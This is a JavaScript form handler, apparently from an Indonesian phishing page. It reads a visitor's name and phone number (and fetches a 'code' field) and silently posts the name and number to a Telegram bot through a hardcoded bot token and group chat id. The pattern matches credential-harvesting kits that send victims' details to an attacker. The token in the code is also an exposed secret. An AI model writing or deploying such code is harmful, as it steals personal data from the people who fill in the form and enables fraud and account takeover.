function kirimPesan() {

    var name = document.getElementById('name');
    var nomorhp = document.getElementById('nomorhp');
    var code = document.getElementById('code');

    var gabungan = '%F0%9D%90%83%F0%9D%90%9A%F0%9D%90%AD%F0%9D%90%9A%0A%0ANama%20%3A%20' + name.value + '%0APhone%20%3A%20%2B62' + nomorhp.value;

    var token = '7502188086:AAEr-hPf1vs0wRDiI69OoAbPTDKkMINz_6s';
    var grup = '-1002313585294';

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
    })
}